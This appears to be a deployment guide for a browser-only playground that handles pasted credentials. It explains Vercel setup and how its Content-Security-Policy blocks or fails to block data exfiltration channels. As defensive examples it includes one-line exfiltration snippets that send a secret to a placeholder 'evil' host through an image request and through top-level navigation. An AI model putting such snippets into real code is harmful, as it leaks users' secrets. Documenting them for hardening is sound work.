# Deploying the playground

The playground is a static single-page app with no backend. Any static host will
serve it, but [`vercel.json`](vercel.json) is included because the response
headers it sets are the point of the deployment, not decoration.

## Vercel

Import the repository, then set **one** setting:

| Setting | Value |
| --- | --- |
| Root Directory | `web` |
| Framework Preset | Vite (auto-detected) |
| Build Command | `npm run build` (from `vercel.json`) |
| Output Directory | `dist` (from `vercel.json`) |

Everything else comes from `vercel.json`. Deploy only the `web/` directory — the
Python CLI is published to PyPI by
[`.github/workflows/release.yml`](../.github/workflows/release.yml) and has
nothing to do with Vercel.

Or from the CLI:

```bash
npm i -g vercel
cd web
vercel --prod
```

## What the CSP buys you

The README claims that nothing you paste ever leaves the tab. Served with these
headers, that stops being a promise and becomes something the browser enforces:

```
connect-src 'none'
```

Verified in a browser against the production build. Two groups matter, because
they fail for different reasons.

**Channels that read a response.** These are the obvious ones, and CORS already
limits them:

| Channel | Result | Blocked by |
| --- | --- | --- |
| `fetch()` to a third party | Blocked | `connect-src 'none'` |
| `XMLHttpRequest` | Blocked | `connect-src 'none'` |
| `WebSocket` | Blocked | `connect-src 'none'` |
| `fetch()` to its own origin | Blocked | `connect-src 'none'` |

**Channels that only need the request to leave.** These are the ones that
actually matter: CORS does not stop them, because exfiltration never needs to
read a response. All are blocked here:

| Channel | Result | Blocked by |
| --- | --- | --- |
| `navigator.sendBeacon()` | Blocked | `connect-src 'none'` |
| `new Image().src = "https://evil/?d=…"` | Blocked | `img-src 'self' data:` |
| Injected `<script src>` | Blocked | `script-src 'self'` |
| Injected `<link rel=stylesheet>` | Blocked | `style-src …` |
| `<form method=POST>` to a third party | Blocked | `form-action 'none'` |

`navigator.sendBeacon()` deserves a note: it returns `true` even when the CSP
blocks it, because it is fire-and-forget and reports only that the request was
queued. Trusting its return value would have produced a false "not blocked"
result. The console violation is the real signal.

## What the CSP does not stop

**Top-level navigation.** A script can still do
`location.href = "https://evil/?d=" + secret`, and it works — verified, not
assumed. CSP has no directive that prevents this: `navigate-to` was dropped from
the specification and never shipped.

This is a real gap, and it is worth being precise about how much it matters.
Reaching it requires arbitrary script execution on the page, which
`script-src 'self'` (with no `'unsafe-inline'`, and no third-party origins)
already prevents for an injected attacker. So the remaining threat model is *the
deployed bundle itself being malicious* — that is, not trusting whoever ran
`vercel --prod`. The CSP cannot solve that, and neither can any other header.
What answers it is the build being open source, reproducible from this
repository, and shipped with source maps so anyone can read what actually runs.

The practical difference is that every **silent** channel is closed. Exfiltration
via navigation destroys the page the user was looking at, which is not something
that goes unnoticed.

`script-src 'self'` carries no `'unsafe-inline'` — the Vite build emits no inline
scripts, so nothing had to be relaxed to make the page work. The one concession
is `'unsafe-inline'` in `style-src`, which React's `style={{…}}` attributes
require (the editor gutter offset and the chart legend colours are computed at
runtime). `style-src-attr` would express that more precisely, but browser support
is uneven and a broken layout is a worse outcome than a permissive style policy —
particularly when `connect-src 'none'` already closes the channel a CSS injection
would need to exfiltrate anything.

## Two things that will break the CSP

**Vercel Web Analytics and Speed Insights.** Both inject a script that beacons
back to Vercel. `connect-src 'none'` blocks it, and the feature will silently do
nothing. Leaving them off is the right call here: a page whose entire value
proposition is "your credentials never leave this tab" should not be running
telemetry. If you enable them anyway, you must widen `connect-src` — and update
the claim in the README to match.

**Any future feature that fetches.** Loading a sample from a URL, checking for a
newer ruleset, reporting a false positive from the UI. All are blocked by design.
The sample documents are compiled into the bundle precisely so that nothing has
to be fetched at runtime.

## Self-hosting the font

The page pulls Archivo, Public Sans and JetBrains Mono from Google Fonts, which is why `fonts.googleapis.com` and
`fonts.gstatic.com` appear in the CSP. Pasted content is never involved, but the
request does expose each visitor's IP address to Google.

To remove the third-party origin entirely, delete the three `<link>` tags from
[`index.html`](index.html). Tailwind's font stack already falls back to the
system UI font, so the layout is unaffected — only the typeface changes. The CSP
then simplifies to:

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';
font-src 'self'; img-src 'self' data:; connect-src 'none'; object-src 'none';
base-uri 'self'; form-action 'none'; frame-ancestors 'none'
```

## Other hosts

**Netlify** — equivalent headers go in a `_headers` file or `netlify.toml`.

**GitHub Pages** — works, but it cannot send custom response headers, so you lose
the CSP. Given that the CSP is the reason to deploy this carefully, prefer a host
that supports headers. A `<meta http-equiv="Content-Security-Policy">` tag is a
partial fallback: it covers `connect-src` but silently ignores `frame-ancestors`.

**Self-hosted** — `npm run build` and serve `dist/` from any web server,
replicating the headers from `vercel.json`.
